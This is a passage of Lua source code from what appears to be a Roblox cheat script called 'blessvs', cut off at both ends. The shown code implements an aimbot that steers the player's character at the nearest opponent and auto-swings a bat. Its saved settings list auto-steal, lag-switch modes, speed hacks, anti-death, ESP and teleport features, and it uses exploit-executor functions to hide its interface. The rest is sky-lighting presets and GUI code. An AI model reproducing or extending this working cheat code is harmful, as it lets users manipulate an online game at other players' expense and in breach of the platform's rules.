	_aimbotConn = RunService.RenderStepped:Connect(function()
		if not State.BatAimbot then return end
		local char = LP.Character
		if not char then return end
		local root = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not root or not hum then return end

		if not char:FindFirstChildOfClass("Tool") then
			local bat = getBat()
			if bat then pcall(function() hum:EquipTool(bat) end) end
		end

		local targetPlr, targetDist = getClosestPlayerAimbot()
		if not targetPlr or not targetPlr.Character then return end
		local target = targetPlr.Character:FindFirstChild("HumanoidRootPart")
		if not target then return end

		local targetVel = target.AssemblyLinearVelocity
		local myPos = root.Position
		local targetPos = target.Position

		local predictPos = targetPos + targetVel * 0.14
		predictPos = predictPos + target.CFrame.LookVector * 0.3

		local direction = predictPos - myPos
		local flatDir = Vector3.new(direction.X, 0, direction.Z)
		if flatDir.Magnitude > 0 then flatDir = flatDir.Unit else flatDir = Vector3.new(0, 0, 0) end

		local desiredHeight = targetPos.Y + 3.7
		local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
		if hum.FloorMaterial ~= Enum.Material.Air then
			yVel = math.max(yVel, 13)
		end
		yVel = math.clamp(yVel, -70, 110)

		local desiredVel = Vector3.new(flatDir.X * AIMBOT_SPEED, yVel, flatDir.Z * AIMBOT_SPEED)
		root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)

		local speed3 = targetVel.Magnitude
		local predictTime = math.clamp(speed3 / 150, 0.05, 0.2)
		local predictedPos = targetPos + targetVel * predictTime
		local toPredict = predictedPos - myPos
		if toPredict.Magnitude > 0.1 then
			local goalCF = CFrame.lookAt(myPos, predictedPos)
			local diffCF = root.CFrame:Inverse() * goalCF
			local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
			rx = math.clamp(rx, -2.5, 2.5)
			ry = math.clamp(ry, -2.5, 2.5)
			rz = math.clamp(rz, -2.5, 2.5)
			root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(
				Vector3.new(rx * 42, ry * 42, rz * 42)
			)
		end

		if targetDist <= HIT_DIST then trySwing() end
	end)
	saveConfig()
end

stopBatAimbot = function()
	if _aimbotConn then
		pcall(function() _aimbotConn:Disconnect() end)
		_aimbotConn = nil
	end
	autoBatEnabled = false
	State.AutoBat = false
	State.BatAimbot = false
	_hittingCooldown = false
	local char = LP.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if root then root.AssemblyLinearVelocity = Vector3.zero; root.AssemblyAngularVelocity = Vector3.zero end
	if hum then
		hum.AutoRotate = (_prevAutoRotate == nil) and true or _prevAutoRotate
		hum.PlatformStand = false
		pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
	end
	_prevAutoRotate = nil
	saveConfig()
end

function queueAutoLeftStart()
	if State.BatV2 then
		State.BatV2 = false
		stopBatV2Aimbot()
		if setBatV2Visual then setBatV2Visual(false) end
	end
	if tpBatEnabled then
		stopTpBat()
		if tpBatSetVisual then tpBatSetVisual(false) end
	end

	if autoRightEnabled then
		autoRightEnabled = false
		stopAutoRight()
		if autoRightSetVisual then autoRightSetVisual(false) end
	end

	autoLeftEnabled = true
	if autoBatEnabled then stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end end
	startAutoLeft()
end

function queueAutoRightStart()
	if State.BatV2 then
		State.BatV2 = false
		stopBatV2Aimbot()
		if setBatV2Visual then setBatV2Visual(false) end
	end
	if tpBatEnabled then
		stopTpBat()
		if tpBatSetVisual then tpBatSetVisual(false) end
	end

	if autoLeftEnabled then
		autoLeftEnabled = false
		stopAutoLeft()
		if autoLeftSetVisual then autoLeftSetVisual(false) end
	end

	autoRightEnabled = true
	if autoBatEnabled then stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end end
	startAutoRight()
end

LP.CharacterRemoving:Connect(function()
	if antiDieEnabled or batMotionAntiDieGuard then
		antiDieToken = antiDieToken + 1
		clearAntiDieConns()
	end
end)

LP.CharacterAdded:Connect(function(char)
	task.wait(0.5)
	setupSpeedIndicator(char)
	if antiDieEnabled or batMotionAntiDieGuard then startAntiDie() end
	if medusaCounterEnabled then setupMedusa(char) end
	if batCounterEnabled then startBatCounter() end
	if autoBatEnabled then task.wait(0.2); resetAutoBatMotion(); startBatAimbot() end
	if tpBatEnabled then task.wait(0.2); _tpBatSetupChar(char); startTpBat() end
	if unwalkEnabled then task.wait(0.5); startUnwalk() end
	if ragdolTimerEnabled then task.wait(0.3); ragdolSetupDetection(char); ragdolCreateBillboard() end
	if vampireAnimEnabled then task.wait(0.3); _applyVampireAnim(char) end
end)

if LP.Character then setupSpeedIndicator(LP.Character) end

function hookOtherSpeed(plr)
	if plr == LP then return end
	if plr.Character then task.spawn(function() setupSpeedIndicator(plr.Character, plr) end) end
	plr.CharacterAdded:Connect(function(char) task.wait(0.5); setupSpeedIndicator(char, plr) end)
	plr.CharacterRemoving:Connect(function() otherSpeedLabels[plr] = nil end)
end

for _, plr in ipairs(Players:GetPlayers()) do hookOtherSpeed(plr) end
Players.PlayerAdded:Connect(hookOtherSpeed)
Players.PlayerRemoving:Connect(function(plr) otherSpeedLabels[plr] = nil end)

CANDY_SKY_TAG = "blessvsSkyTheme"
_G._blessvsSkyMode = _G._blessvsSkyMode or "Off"
candyOriginalLighting = nil

CANDY_SKY_PRESETS = {
	["Off"] = { kind = "off" },
	["Night"] = { clock = 22, brightness = 2, ambient = { 110, 110, 110 }, outAmb = { 120, 120, 120 }, sky = { stars = 4000, moon = 18, sun = 0, moonTex = true }, atm = { dens = 0.45, color = { 120, 120, 120 }, decay = { 60, 60, 60 }, glare = 0.5, haze = 1.2 } },
	["Aurora"] = { clock = 14, brightness = 3, ambient = { 150, 150, 150 }, outAmb = { 160, 160, 160 }, atm = { dens = 0.55, color = { 200, 200, 200 }, decay = { 180, 180, 180 }, glare = 2.5, haze = 3 }, clouds = { cover = 0.7, dens = 0.7, color = { 240, 240, 240 } } },
	["Sunset"] = { clock = 17.2, brightness = 2.5, ambient = { 170, 170, 170 }, outAmb = { 180, 180, 180 }, sky = { stars = 0, sun = 25, moon = 0 }, atm = { dens = 0.5, color = { 200, 200, 200 }, decay = { 180, 180, 180 }, glare = 2, haze = 2.5 }, clouds = { cover = 0.55, dens = 0.55, color = { 220, 220, 220 } } },
	["Galaxy"] = { clock = 0, brightness = 1.5, ambient = { 70, 70, 70 }, outAmb = { 80, 80, 80 }, sky = { stars = 10000, moon = 30, sun = 0 }, atm = { dens = 0.15, color = { 40, 40, 40 }, decay = { 20, 20, 20 }, glare = 0.3, haze = 0.5 } },
	["Cyber"] = { clock = 21, brightness = 2.2, ambient = { 90, 90, 90 }, outAmb = { 100, 100, 100 }, sky = { stars = 2000, moon = 12 }, atm = { dens = 0.4, color = { 200, 200, 200 }, decay = { 180, 180, 180 }, glare = 2, haze = 2 }, clouds = { cover = 0.4, dens = 0.6, color = { 200, 200, 200 } } },
	["Sakura"] = { clock = 11, brightness = 3.5, ambient = { 170, 170, 170 }, outAmb = { 180, 180, 180 }, sky = { sun = 8 }, atm = { dens = 0.3, color = { 220, 220, 220 }, decay = { 200, 200, 200 }, glare = 1, haze = 1.5 }, clouds = { cover = 0.6, dens = 0.4, color = { 250, 250, 250 } } },
	["Pink Night"] = { clock = 23, brightness = 2.2, ambient = { 120, 120, 120 }, outAmb = { 140, 140, 140 }, sky = { stars = 5000, moon = 22, sun = 0, moonTex = true }, atm = { dens = 0.5, color = { 200, 200, 200 }, decay = { 160, 160, 160 }, glare = 0.7, haze = 1.4 }, clouds = { cover = 0.3, dens = 0.5, color = { 180, 180, 180 } } },
	["Blood Moon"] = { clock = 22.5, brightness = 1.6, ambient = { 130, 130, 130 }, outAmb = { 150, 150, 150 }, sky = { stars = 1500, moon = 28, sun = 0, moonTex = true }, atm = { dens = 0.6, color = { 200, 200, 200 }, decay = { 160, 160, 160 }, glare = 1.4, haze = 2 }, clouds = { cover = 0.5, dens = 0.7, color = { 160, 160, 160 } } },
	["Emerald Dawn"] = { clock = 6.5, brightness = 2.8, ambient = { 130, 130, 130 }, outAmb = { 140, 140, 140 }, sky = { sun = 18, moon = 0, stars = 0 }, atm = { dens = 0.4, color = { 180, 180, 180 }, decay = { 160, 160, 160 }, glare = 1.8, haze = 2.2 }, clouds = { cover = 0.5, dens = 0.5, color = { 220, 220, 220 } } },
	["Volcanic"] = { clock = 19, brightness = 2, ambient = { 180, 180, 180 }, outAmb = { 200, 200, 200 }, sky = { stars = 200, sun = 12, moon = 0 }, atm = { dens = 0.75, color = { 200, 200, 200 }, decay = { 180, 180, 180 }, glare = 3, haze = 3.5 }, clouds = { cover = 0.8, dens = 0.9, color = { 160, 160, 160 } } },
	["Arctic"] = { clock = 9, brightness = 3.2, ambient = { 200, 200, 200 }, outAmb = { 210, 210, 210 }, sky = { sun = 10, stars = 0, moon = 0 }, atm = { dens = 0.3, color = { 200, 200, 200 }, decay = { 180, 180, 180 }, glare = 1.5, haze = 1.8 }, clouds = { cover = 0.7, dens = 0.6, color = { 250, 250, 250 } } },
	["Midnight Ocean"] = { clock = 1.5, brightness = 1.7, ambient = { 60, 60, 60 }, outAmb = { 70, 70, 70 }, sky = { stars = 6000, moon = 24, sun = 0, moonTex = true }, atm = { dens = 0.5, color = { 80, 80, 80 }, decay = { 60, 60, 60 }, glare = 0.6, haze = 1.5 } },
	["Vaporwave"] = { clock = 19.5, brightness = 2.4, ambient = { 180, 180, 180 }, outAmb = { 190, 190, 190 }, sky = { stars = 1000, moon = 14 }, atm = { dens = 0.45, color = { 200, 200, 200 }, decay = { 180, 180, 180 }, glare = 2.2, haze = 2.4 }, clouds = { cover = 0.5, dens = 0.55, color = { 220, 220, 220 } } },
	["Toxic"] = { clock = 13, brightness = 2.5, ambient = { 140, 140, 140 }, outAmb = { 150, 150, 150 }, atm = { dens = 0.55, color = { 200, 200, 200 }, decay = { 180, 180, 180 }, glare = 1.8, haze = 2.6 }, clouds = { cover = 0.65, dens = 0.7, color = { 220, 220, 220 } } },
	["Solar Eclipse"] = { clock = 12, brightness = 0.9, ambient = { 50, 50, 50 }, outAmb = { 60, 60, 60 }, sky = { stars = 3500, sun = 22, moon = 0 }, atm = { dens = 0.5, color = { 200, 200, 200 }, decay = { 40, 40, 40 }, glare = 2.8, haze = 1.8 } },
	["Hellscape"] = { clock = 18, brightness = 1.8, ambient = { 200, 200, 200 }, outAmb = { 220, 220, 220 }, sky = { stars = 100, sun = 30, moon = 0 }, atm = { dens = 0.85, color = { 200, 200, 200 }, decay = { 160, 160, 160 }, glare = 3.5, haze = 4 }, clouds = { cover = 0.95, dens = 0.95, color = { 120, 120, 120 } } },
	["Heaven"] = { clock = 12, brightness = 4, ambient = { 240, 240, 240 }, outAmb = { 250, 250, 250 }, sky = { sun = 16, moon = 0, stars = 0 }, atm = { dens = 0.25, color = { 255, 255, 255 }, decay = { 240, 240, 240 }, glare = 3, haze = 1.5 }, clouds = { cover = 0.85, dens = 0.5, color = { 255, 255, 255 } } },
	["Storm"] = { clock = 15, brightness = 1.4, ambient = { 90, 90, 90 }, outAmb = { 100, 100, 100 }, sky = { stars = 0, sun = 6, moon = 0 }, atm = { dens = 0.65, color = { 90, 90, 90 }, decay = { 70, 70, 70 }, glare = 0.5, haze = 3 }, clouds = { cover = 0.95, dens = 0.95, color = { 70, 70, 70 } } },
	["Sunrise"] = { clock = 6.2, brightness = 2.8, ambient = { 220, 220, 220 }, outAmb = { 230, 230, 230 }, sky = { sun = 22, stars = 0, moon = 0 }, atm = { dens = 0.45, color = { 220, 220, 220 }, decay = { 200, 200, 200 }, glare = 2.4, haze = 2.2 }, clouds = { cover = 0.4, dens = 0.4, color = { 240, 240, 240 } } },
	["Deep Space"] = { clock = 0, brightness = 1, ambient = { 30, 30, 30 }, outAmb = { 40, 40, 40 }, sky = { stars = 15000, moon = 0, sun = 0 }, atm = { dens = 0.08, color = { 20, 20, 20 }, decay = { 10, 10, 10 }, glare = 0.2, haze = 0.3 } },
	["Lavender Dream"] = { clock = 18.5, brightness = 2.6, ambient = { 180, 180, 180 }, outAmb = { 190, 190, 190 }, sky = { stars = 800, moon = 16, sun = 0 }, atm = { dens = 0.4, color = { 200, 200, 200 }, decay = { 180, 180, 180 }, glare = 1.4, haze = 1.8 }, clouds = { cover = 0.55, dens = 0.5, color = { 220, 220, 220 } } },
	["Inferno"] = { clock = 17.5, brightness = 2.2, ambient = { 220, 220, 220 }, outAmb = { 235, 235, 235 }, sky = { sun = 26, moon = 0, stars = 0 }, atm = { dens = 0.6, color = { 220, 220, 220 }, decay = { 200, 200, 200 }, glare = 3, haze = 3.2 }, clouds = { cover = 0.7, dens = 0.7, color = { 200, 200, 200 } } },
	["Mint Sky"] = { clock = 10, brightness = 3.2, ambient = { 180, 180, 180 }, outAmb = { 190, 190, 190 }, sky = { sun = 10 }, atm = { dens = 0.32, color = { 220, 220, 220 }, decay = { 200, 200, 200 }, glare = 1.6, haze = 1.6 }, clouds = { cover = 0.55, dens = 0.45, color = { 250, 250, 250 } } },
}

function candySaveOriginalLighting()
	if candyOriginalLighting then return end
	candyOriginalLighting = {
		ClockTime = Lighting.ClockTime,
		OutdoorAmbient = Lighting.OutdoorAmbient,
		Ambient = Lighting.Ambient,
		Brightness = Lighting.Brightness,
		FogStart = Lighting.FogStart,
		FogEnd = Lighting.FogEnd,
		FogColor = Lighting.FogColor,
		ColorShift_Top = Lighting.ColorShift_Top,
		ColorShift_Bottom = Lighting.ColorShift_Bottom,
		GeographicLatitude = Lighting.GeographicLatitude,
		GlobalShadows = Lighting.GlobalShadows,
		LightingChildren = {},
		TerrainChildren = {}
	}
	for _, child in ipairs(Lighting:GetChildren()) do
		if child:IsA("Sky") or child:IsA("Atmosphere") then table.insert(candyOriginalLighting.LightingChildren, child:Clone()) end
	end
	local terrain = workspace:FindFirstChildOfClass("Terrain")
	if terrain then
		for _, child in ipairs(terrain:GetChildren()) do
			if child:IsA("Clouds") then table.insert(candyOriginalLighting.TerrainChildren, child:Clone()) end
		end
	end
end

function candyClearSky(removeAll)
	for _, child in ipairs(Lighting:GetChildren()) do
		if child:GetAttribute(CANDY_SKY_TAG) or (removeAll and (child:IsA("Sky") or child:IsA("Atmosphere"))) then pcall(function() child:Destroy() end) end
	end
	local terrain = workspace:FindFirstChildOfClass("Terrain")
	if terrain then
		for _, child in ipairs(terrain:GetChildren()) do
			if child:GetAttribute(CANDY_SKY_TAG) or (removeAll and child:IsA("Clouds")) then pcall(function() child:Destroy() end) end
		end
	end
end

function candyInstance(className, parent, props)
	local inst = Instance.new(className)
	inst:SetAttribute(CANDY_SKY_TAG, true)
	for k, v in pairs(props or {}) do pcall(function() inst[k] = v end) end
	inst.Parent = parent
	return inst
end

function candyColor(rgb)
	return Color3.fromRGB(rgb[1], rgb[2], rgb[3])
end

function CandyApplyCustomSky(mode)
	candySaveOriginalLighting()
	candyClearSky(true)
	local terrain = workspace:FindFirstChildOfClass("Terrain")
	local preset = CANDY_SKY_PRESETS[mode]
	if not preset or preset.kind == "off" then
		if candyOriginalLighting then
			for k, v in pairs(candyOriginalLighting) do
				if k ~= "LightingChildren" and k ~= "TerrainChildren" then pcall(function() Lighting[k] = v end) end
			end
			for _, child in ipairs(candyOriginalLighting.LightingChildren or {}) do child:Clone().Parent = Lighting end
			local offTerrain = workspace:FindFirstChildOfClass("Terrain")
			if offTerrain then
				for _, child in ipairs(candyOriginalLighting.TerrainChildren or {}) do child:Clone().Parent = offTerrain end
			end
		end
		_G._blessvsSkyMode = "Off"
		return
	end

	Lighting.FogStart = 0
	Lighting.FogEnd = 100000
	Lighting.FogColor = Color3.fromRGB(200, 200, 200)
	Lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
	Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
	Lighting.GlobalShadows = true
	Lighting.ClockTime = preset.clock or 14
	Lighting.Brightness = preset.brightness or 2
	if preset.outAmb then Lighting.OutdoorAmbient = candyColor(preset.outAmb) end
	if preset.ambient then Lighting.Ambient = candyColor(preset.ambient) end

	if preset.sky then
		local skyProps = {}
		if preset.sky.stars then skyProps.StarCount = preset.sky.stars end
		if preset.sky.moon then skyProps.MoonAngularSize = preset.sky.moon end
		if preset.sky.sun then skyProps.SunAngularSize = preset.sky.sun end
		if preset.sky.moonTex then skyProps.MoonTextureId = "rbxasset://sky/moon.jpg" end
		candyInstance("Sky", Lighting, skyProps)
	end

	if preset.atm then
		candyInstance("Atmosphere", Lighting, {
			Density = preset.atm.dens or 0.3,
			Color = candyColor(preset.atm.color),
			Decay = candyColor(preset.atm.decay),
			Glare = preset.atm.glare or 1,
			Haze = preset.atm.haze or 1
		})
	end

	if preset.clouds and terrain then
		candyInstance("Clouds", terrain, {
			Cover = preset.clouds.cover or 0.5,
			Density = preset.clouds.dens or 0.5,
			Color = candyColor(preset.clouds.color)
		})
	end

	_G._blessvsSkyMode = mode
end

CandySkyOrder = {
	{ "Off", "Off" }, { "Night", "Night" }, { "Aurora", "Aurora" }, { "Sunset", "Sunset" },
	{ "Galaxy", "Galaxy" }, { "Cyber", "Cyber" }, { "Sakura", "Sakura" }, { "Pink Night", "Pink Night" },
	{ "Blood Moon", "Blood Moon" }, { "Emerald Dawn", "Emerald Dawn" }, { "Volcanic", "Volcanic" },
	{ "Arctic", "Arctic" }, { "Midnight Ocean", "Midnight Ocean" }, { "Vaporwave", "Vaporwave" },
	{ "Toxic", "Toxic" }, { "Solar Eclipse", "Solar Eclipse" }, { "Hellscape", "Hellscape" },
	{ "Heaven", "Heaven" }, { "Storm", "Storm" }, { "Sunrise", "Sunrise" }, { "Deep Space", "Deep Space" },
	{ "Lavender Dream", "Lavender Dream" }, { "Inferno", "Inferno" }, { "Mint Sky", "Mint Sky" }
}

-- ============================================================
-- CONFIG HELPERS
-- ============================================================
function saveConfig()
	local function ks(e)
		return { kb = e.kb and e.kb.Name or nil, gp = e.gp and e.gp.Name or nil }
	end
	local cfg = {
		normalSpeed = NS, carrySpeed = CS,
		dropBrainrotKey = ks(KB.DropBrainrot), autoLeftKey = ks(KB.AutoLeft), autoRightKey = ks(KB.AutoRight), speedToggleKey = ks(KB.SpeedToggle),
		autoBatKey = ks(KB.AutoBat), laggerToggleKey = ks(KB.LaggerToggle), laggerCarryToggleKey = ks(KB.LaggerCarryToggle), blessLaggerKey = ks(KB.BlessLagger), tpFloorKey = ks(KB.TPFloor),
		guiHideKey = ks(KB.GuiHide), batV2Key = ks(KB.BatV2), tpBatKey = ks(KB.TPBat),
		autoStealRange = CONFIG.STEAL_RANGE, holdMax = CONFIG.HOLD_MAX,
		antiRagdoll = antiRagdollEnabled, antiDie = antiDieEnabled, autoStealEnabled = CONFIG.AUTO_STEAL_ENABLED,
		infiniteJump = infJumpEnabled, medusaCounter = medusaCounterEnabled,
		batCounter = batCounterEnabled,
		carryMode = speedMode, laggerMode = laggerToggled, autoCarry = autoCarryEnabled, laggerCarryMode = laggerCarryToggled, laggerSpeed = LAGGER_SPEED, laggerCarrySpeed = LAGGER_CARRY_SPEED, aimbotSpeed = AIMBOT_SPEED, batV2Speed = BAT_V2_CHASE_SPD,
		autoBat = autoBatEnabled, autoSwing = autoSwingEnabled,
		unwalkEnabled = unwalkEnabled,
		antiLag = antiLagEnabled, stretchRez = stretchRezEnabled,
		espEnabled = espEnabled,
		ragdolTimer = ragdolTimerEnabled,
		autoTPEnabled = autoTPEnabled, autoTPHeight = autoTPHeight,
		autoTPDownEnabled = autoTPDownEnabled, autoTPDownThreshold = autoTPDownThreshold,
		holdJumpEnabled = holdJumpEnabled,
		showIntro = showIntroEnabled,
		uiLocked = uiLocked,
		uiScale = uiScaleValue,
		mobileButtonScale = mobileButtonScaleValue,
		editMobileButtons = editMobileButtons,
		hideMobileButtons = hideMobileButtons,
		mobileButtonPositions = mobileButtonPositions,
		mobileGroupPosition = mobileGroupPosition,
		blessLaggerPanelOpen = blessLaggerPanelOpen,
		blessLaggerPanelPosition = blessLaggerPanelPosition,
		blessLaggerEnabled = blessLaggerActive,
		skyTheme = currentSkyTheme,
		safeModeEnabled = _GACC.safeModeEnabled,
		bodyLockEnabled = bodyLockEnabled,
		tpBatEnabled = tpBatEnabled,
		vampireAnimEnabled = vampireAnimEnabled,
		currentFontIdx = _currentFontIdx, -- I-SAVE ANG FONT INDEX
		fovEnabled = fovEnabled,
		stretchRezEnabled = stretchRezEnabled,
		guiPosition = { xs = guiPosition.X.Scale, x = guiPosition.X.Offset, ys = guiPosition.Y.Scale, y = guiPosition.Y.Offset },
		stealPodPosition = { xs = stealPodPosition.X.Scale, x = stealPodPosition.X.Offset, ys = stealPodPosition.Y.Scale, y = stealPodPosition.Y.Offset },
		miniButtonPosition = { xs = miniButtonPosition.X.Scale, x = miniButtonPosition.X.Offset, ys = miniButtonPosition.Y.Scale, y = miniButtonPosition.Y.Offset }
	}
	if writefile then pcall(function() writefile("blessvs.json", HS:JSONEncode(cfg)) end) end
end

task.spawn(function() while task.wait(5) do saveConfig() end end)

-- ============================================================
-- UI STATE / HELPERS
-- ============================================================
setInstaGrab, setInfJumpVisual, setAntiDieVisual, setMedusaVisual, setShowIntroVisual = nil, nil, nil, nil, nil
setUnwalkVisual, setAntiLagVisual, setAutoSwingVisual, setAntiRagVisual = nil, nil, nil, nil
normalBox, carryBox, laggerBox, laggerCarryBox, radInput, holdMaxBox, autoTPHeightBox = nil, nil, nil, nil, nil, nil, nil
autoCarryEnabled = false
setAutoCarryVisual = nil

refreshSpeedModeLabel = function()
	if modeValLbl then
		if laggerCarryToggled then modeValLbl.Text = "Lagger Carry"
		elseif laggerToggled then modeValLbl.Text = "Lagger"
		elseif speedMode then modeValLbl.Text = "Carry"
		else modeValLbl.Text = "Normal" end
	end
	if setCarryModeVisual then setCarryModeVisual(speedMode) end
	if setLaggerModeVisual then setLaggerModeVisual(laggerToggled) end
	if setLaggerCarryVisual then setLaggerCarryVisual(laggerCarryToggled) end
end

function toggleCarryMode()
	if laggerToggled or laggerCarryToggled then
		laggerToggled = false
		laggerCarryToggled = false
		speedMode = true
	else
		speedMode = not speedMode
	end
	refreshSpeedModeLabel()
end

function toggleLaggerMode()
	if laggerCarryToggled then laggerCarryToggled = false end
	speedMode = false
	laggerToggled = not laggerToggled
	refreshSpeedModeLabel()
end

function toggleLaggerCarryMode()
	if laggerToggled then laggerToggled = false end
	speedMode = false
	laggerCarryToggled = not laggerCarryToggled
	refreshSpeedModeLabel()
end

function disableLaggerMode()
	laggerToggled = false
	laggerCarryToggled = false
	refreshSpeedModeLabel()
end

function setCarryModeState(on)
	if speedMode ~= on then toggleCarryMode() else refreshSpeedModeLabel() end
end

function setLaggerModeState(on)
	if on and not laggerToggled then laggerToggled = true; refreshSpeedModeLabel()
	elseif not on and laggerToggled then disableLaggerMode() end
end

-- ============================================================
-- INTRO ANIMATION (DISABLED)
-- ============================================================
function playCandyIntro(gui, main, miniBtn)
	main.Visible = true
	miniBtn.Visible = false
end

-- ============================================================
-- GUI BUILDER
-- ============================================================
function buildGui()
	local BG = BLESS_COLORS.BG
	local PANEL = BLESS_COLORS.PANEL
	local CARD = BLESS_COLORS.CARD
	local ACCENT = BLESS_COLORS.ACCENT
	local ICE = BLESS_COLORS.ICE
	local HOVER = BLESS_COLORS.HOVER
	local W = BLESS_COLORS.TEXT
	local DIM = BLESS_COLORS.SECONDARY
	local STROKE = BLESS_COLORS.STROKE
	local INP = BLESS_COLORS.INPUT
	local OFF = BLESS_COLORS.OFF
	local IsMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
	local GUI_W, GUI_H = IsMobile and 320 or 420, IsMobile and 420 or 520
	local HDR_H = IsMobile and 56 or 64
	local LOGO = IsMobile and 34 or 40
	local PAD = IsMobile and 10 or 14
	local PAGE_TOP = HDR_H + (IsMobile and 12 or 16)
	local PAGE_BOTTOM = PAGE_TOP + (IsMobile and 10 or 14)
	local ROW_H = IsMobile and 32 or 38
	local SECTION_H = IsMobile and 18 or 22

	local old = game:GetService("CoreGui"):FindFirstChild("blessvs")
	if old then old:Destroy() end
	local pg = LP:FindFirstChild("PlayerGui")
	if pg then
		local o = pg:FindFirstChild("blessvs")
		if o then o:Destroy() end
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "blessvs"
	gui.ResetOnSpawn = false
	gui.DisplayOrder = 10
	gui.IgnoreGuiInset = true
	pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
	if not pcall(function() gui.Parent = game:GetService("CoreGui") end) then gui.Parent = LP:WaitForChild("PlayerGui") end

	-- Apply fonts to GUI when created
	local function applyFontsToGui()
		applyFontToGui(gui)
	end
	task.spawn(applyFontsToGui)

	local function drag(f, onDragState)
		local dn, ds, sp, di = false
		local moved = false
		local threshold = 6
		f.InputBegan:Connect(function(i)
			if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
				if uiLocked then return end
				dn = true
				ds = i.Position
				sp = f.Position
				moved = false
				if onDragState then onDragState(false, false) end
				i.Changed:Connect(function()
					if i.UserInputState == Enum.UserInputState.End then
						dn = false
						if onDragState then onDragState(false, moved) end
					end
				end)
			end
		end)
		f.InputChanged:Connect(function(i)
			if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then di = i end
		end)
		UIS.InputChanged:Connect(function(i)
			if i == di and dn and not uiLocked then
				local dx, dy = i.Position.X - ds.X, i.Position.Y - ds.Y
				if (math.abs(dx) > threshold or math.abs(dy) > threshold) and not moved then
					moved = true
					if onDragState then onDragState(true, true) end
				end
				f.Position = UDim2.new(sp.X.Scale, sp.X.Offset + dx, sp.Y.Scale, sp.Y.Offset + dy)
			end
		end)
	end

	local function buildBlessLaggerPanel()
		local PANEL_W, PANEL_H = 280, 108
		local panel = Instance.new("Frame", gui)
		panel.Name = "BlessLaggerPanel"
		panel.Size = UDim2.new(0, PANEL_W, 0, PANEL_H)
		panel.Position = blessLaggerPanelPosition and UDim2.new(blessLaggerPanelPosition.xs or 0.5, blessLaggerPanelPosition.x or -130, blessLaggerPanelPosition.ys or 0.35, blessLaggerPanelPosition.y or 0) or UDim2.new(0.5, -130, 0.35, 0)
		panel.BackgroundColor3 = BG
		panel.BackgroundTransparency = 0.05
		panel.BorderSizePixel = 0
		panel.Active = true
		panel.Visible = false
		panel.ZIndex = 60
		panel.ClipsDescendants = true
		blessLaggerPanelRef = panel
		Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 12)
		local stroke = Instance.new("UIStroke", panel)
		stroke.Color = ACCENT
		stroke.Thickness = 1.2
		stroke.Transparency = 0.4
		stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		local grad = Instance.new("UIGradient", stroke)
		grad.Color = ColorSequence.new(ACCENT, ICE, ACCENT)
		task.spawn(function()
			while grad and grad.Parent do
				grad.Rotation = (grad.Rotation + 2) % 360
				task.wait(0.05)
			end
		end)

		local header = Instance.new("Frame", panel)
		header.Size = UDim2.new(1, 0, 0, 36)
		header.BackgroundTransparency = 1
		header.BorderSizePixel = 0
		header.ZIndex = 61

		local dragBtn = Instance.new("TextButton", header)
		dragBtn.Size = UDim2.new(1, -34, 1, 0)
		dragBtn.BackgroundTransparency = 1
		dragBtn.Text = ""
		dragBtn.AutoButtonColor = false
		dragBtn.Active = true
		dragBtn.ZIndex = 62

		local dot = Instance.new("Frame", header)
		dot.Size = UDim2.new(0, 8, 0, 8)
		dot.Position = UDim2.new(0, 12, 0.5, -4)
		dot.BackgroundColor3 = ACCENT
		dot.BorderSizePixel = 0
		dot.ZIndex = 63
		Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

		local title = Instance.new("TextLabel", header)
		title.Size = UDim2.new(0, 104, 1, 0)
		title.Position = UDim2.new(0, 26, 0, 0)
		title.BackgroundTransparency = 1
		title.Text = "ELITE Lagger"
		title.TextColor3 = W
		title.Font = Enum.Font.GothamBlack
		title.TextSize = 12
		title.TextXAlignment = Enum.TextXAlignment.Left
		title.ZIndex = 63

		local disc = Instance.new("TextLabel", header)
		disc.Size = UDim2.new(0, 104, 1, 0)
		disc.Position = UDim2.new(1, -138, 0, 0)
		disc.BackgroundTransparency = 1
		disc.Text = BLESS_DISCORD
		disc.TextColor3 = ICE
		disc.Font = Enum.Font.Gotham
		disc.TextSize = 9
		disc.TextXAlignment = Enum.TextXAlignment.Right
		disc.ZIndex = 63

		local close = Instance.new("TextButton", header)
		close.Size = UDim2.new(0, 22, 0, 22)
		close.Position = UDim2.new(1, -28, 0.5, -11)
		close.BackgroundColor3 = CARD
		close.BorderSizePixel = 0
		close.Text = "X"
		close.TextColor3 = DIM
		close.Font = Enum.Font.GothamBold
		close.TextSize = 10
		close.AutoButtonColor = false
		close.ZIndex = 64
		Instance.new("UICorner", close).CornerRadius = UDim.new(1, 0)

		local divider = Instance.new("Frame", panel)
		divider.Size = UDim2.new(1, -20, 0, 1)
		divider.Position = UDim2.new(0, 10, 0, 36)
		divider.BackgroundColor3 = STROKE
		divider.BackgroundTransparency = 0.4
		divider.BorderSizePixel = 0
		divider.ZIndex = 61

		local mainBtn = Instance.new("TextButton", panel)
		mainBtn.Size = UDim2.new(1, -20, 0, 36)
		mainBtn.Position = UDim2.new(0, 10, 0, 44)
		mainBtn.BackgroundColor3 = CARD
		mainBtn.BorderSizePixel = 0
		mainBtn.AutoButtonColor = false
		mainBtn.Text = ""
		mainBtn.ZIndex = 61
		Instance.new("UICorner", mainBtn).CornerRadius = UDim.new(0, 8)

		local btnStroke = Instance.new("UIStroke", mainBtn)
		btnStroke.Color = ACCENT
		btnStroke.Thickness = 1
		btnStroke.Transparency = 0.5

